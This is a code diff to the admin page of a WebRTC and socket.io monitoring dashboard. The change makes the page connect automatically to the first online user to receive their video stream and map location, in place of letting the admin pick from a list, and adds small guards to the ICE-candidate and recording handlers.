@@ -2,51 +2,32 @@ const socket = io();
 socket.emit("role", { role: "admin", name: "Admin" });
 
 let pc = null;
-let selectedUser = null;
+let currentUser = null;
 let mediaRecorder = null;
 let chunks = [];
 
-const usersDiv = document.getElementById("users");
 const videoEl = document.getElementById("video");
 
-// MAP
+// Map setup
 const map = L.map('map').setView([20.5937, 78.9629], 5);
 L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
 let marker = null;
 
-// USER LIST
+// AUTO-SELECT THE ONLY USER
 socket.on("user-list", (list) => {
-    usersDiv.innerHTML = "";
-
     if (list.length === 0) {
-        usersDiv.innerHTML = "<p>No users online</p>";
+        currentUser = null;
+        videoEl.srcObject = null;
         return;
     }
 
-    list.forEach(u => {
-        const div = document.createElement("div");
-        div.className = "user-item";
-        div.innerText = `${u.name} (${u.id})`;
-        div.onclick = () => selectUser(u.id, div);
-        usersDiv.appendChild(div);
-    });
+    // Always auto-connect to the FIRST USER
+    currentUser = list[0].id;
 });
 
-function selectUser(id, div) {
-    selectedUser = id;
-
-    document.querySelectorAll(".user-item").forEach(e =>
-        e.classList.remove("selected")
-    );
-    div.classList.add("selected");
-
-    if (pc) pc.close();
-    videoEl.srcObject = null;
-}
-
-// RECEIVE OFFER FROM USER
+// RECEIVE OFFER AUTOMATICALLY (NO CLICK REQUIRED)
 socket.on("offer", async (data) => {
-    if (data.from !== selectedUser) return;
+    if (data.from !== currentUser) return;
 
     pc = new RTCPeerConnection({
         iceServers: [
@@ -62,7 +43,7 @@ socket.on("offer", async (data) => {
         if (event.candidate) {
             socket.emit("ice-candidate", {
                 candidate: event.candidate,
-                to: selectedUser
+                to: currentUser
             });
         }
     };
@@ -72,17 +53,19 @@ socket.on("offer", async (data) => {
     const answer = await pc.createAnswer();
     await pc.setLocalDescription(answer);
 
-    socket.emit("answer", { answer, to: selectedUser });
+    socket.emit("answer", { answer, to: currentUser });
 });
 
 // ADD ICE CANDIDATE
 socket.on("ice-candidate", async (data) => {
-    if (pc) await pc.addIceCandidate(new RTCIceCandidate(data.candidate));
+    if (pc && data.from === currentUser) {
+        await pc.addIceCandidate(new RTCIceCandidate(data.candidate));
+    }
 });
 
-// LOCATION UPDATE
+// LOCATION UPDATE WITHOUT CLICK
 socket.on("location", (loc) => {
-    if (loc.from !== selectedUser) return;
+    if (loc.from !== currentUser) return;
 
     document.getElementById("locText").innerText =
         `Lat: ${loc.lat}, Lon: ${loc.lon}`;
@@ -116,7 +99,7 @@ document.getElementById("startRec").onclick = () => {
 };
 
 document.getElementById("stopRec").onclick = () => {
-    mediaRecorder.stop();
+    if (mediaRecorder) mediaRecorder.stop();
     document.getElementById("startRec").disabled = false;
     document.getElementById("stopRec").disabled = true;
 };
